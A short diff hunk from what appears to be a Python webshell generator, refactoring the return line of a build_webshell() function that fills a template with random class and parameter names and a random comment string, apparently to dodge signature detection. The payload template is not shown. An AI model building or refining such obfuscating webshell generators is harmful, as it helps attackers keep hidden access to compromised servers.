@@ -35,8 +35,7 @@ def build_webshell():
     rig = '''}'''
     disrupt = "\"/*"+random_keys(7)+"*/\""
     parameter3 = random_name(6)
-    shellc = shell.format(className,parameter1,parameter2,lef,rig,disrupt,parameter3)
-    return shellc
+    return shell.format(className,parameter1,parameter2,lef,rig,disrupt,parameter3)
 
 
 if __name__ == '__main__':
